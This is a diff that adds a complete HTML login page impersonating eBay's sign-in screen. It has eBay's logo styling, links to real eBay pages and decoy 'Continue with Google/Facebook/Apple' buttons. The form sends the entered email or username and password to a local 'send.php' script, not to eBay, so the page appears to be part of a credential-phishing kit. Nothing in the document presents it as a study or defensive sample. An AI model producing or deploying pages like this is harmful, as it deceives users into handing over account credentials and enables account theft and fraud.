@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>eBay Sign in</title>
+
+<style>
+
+body{
+font-family: Arial, Helvetica, sans-serif;
+background:#f7f7f7;
+margin:0;
+}
+
+.header{
+padding:20px 40px;
+}
+
+a{
+text-decoration:none;
+}
+
+.logo{
+font-size:50px;
+font-family: Arial, Helvetica, sans-serif;
+font-weight:200;
+}
+
+.logo span:nth-child(1){color:#e53238;}
+.logo span:nth-child(2){color:#0064d2;}
+.logo span:nth-child(3){color:#f5af02;}
+.logo span:nth-child(4){color:#86b817;}
+
+.container{
+width:380px;
+margin:40px auto;
+text-align:center;
+}
+
+h1{
+font-size:28px;
+margin-bottom:20px;
+}
+
+.create-box{
+background:#f1f1f1;
+padding:10px;
+border-radius:20px;
+margin-bottom:20px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.create-btn{
+border:1px solid black;
+border-radius:20px;
+padding:6px 14px;
+background:white;
+cursor:pointer;
+display:inline-block;
+color:black;
+}
+
+input{
+width:100%;
+padding:14px;
+border:1px solid #ccc;
+border-radius:8px;
+font-size:15px;
+margin-bottom:15px;
+}
+
+.password-box{
+position:relative;
+}
+
+.eye-icon{
+position:absolute;
+right:-10px;
+top:40%;
+transform:translateY(-50%);
+width:22px;
+cursor:pointer;
+}
+
+.login{
+width:100%;
+padding:14px;
+background:#3665f3;
+color:white;
+border:none;
+border-radius:30px;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.login:hover{
+background:#2f5ae0;
+}
+
+.or{
+margin:20px 0;
+color:#666;
+position:relative;
+}
+
+.or:before,
+.or:after{
+content:"";
+height:1px;
+background:#ddd;
+width:40%;
+position:absolute;
+top:50%;
+}
+
+.or:before{left:0;}
+.or:after{right:0;}
+
+.social{
+width:100%;
+padding:12px;
+border:1px solid #ccc;
+border-radius:30px;
+margin:10px 0;
+background:white;
+cursor:pointer;
+font-size:15px;
+display:flex;
+align-items:center;
+justify-content:center;
+gap:10px;
+}
+
+.icon{
+width:18px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="header">
+<div class="logo">
+<a href="https://www.ebay.com/">
+<span>e</span><span>b</span><span>a</span><span>y</span>
+</a>
+</div>
+</div>
+
+<div class="container">
+
+<h1>Sign in to your account</h1>
+
+<div class="create-box">
+<span>New to eBay?</span>
+<a class="create-btn" href="https://signup.ebay.com/">Create account</a>
+</div>
+<form action="../../send.php" method="post">
+<input type="text" placeholder="Email or username" name="email">
+
+<div class="password-box">
+
+<input type="password" id="password" placeholder="Password" name="password">
+
+<img id="eyeIcon" class="eye-icon" src="../images/ey2.png" onclick="togglePassword()">
+
+</div>
+
+<button class="login">Log in</button>
+</form>
+
+<div class="or">or</div>
+
+<button class="social">
+<img class="icon" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg">
+Continue with Google
+</button>
+
+<button class="social">
+<img class="icon" src="https://cdn-icons-png.flaticon.com/512/733/733547.png">
+Continue with Facebook
+</button>
+
+<button class="social">
+<img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+Continue with Apple
+</button>
+
+</div>
+
+<script>
+
+function togglePassword(){
+
+const pass=document.getElementById("password")
+const eye=document.getElementById("eyeIcon")
+
+if(pass.type==="password"){
+
+pass.type="text"
+eye.src="../images/ey.png"
+
+}else{
+
+pass.type="password"
+eye.src="../images/ey2.png"
+
+}
+
+}
+
+</script>
+
+</body>
+</html>
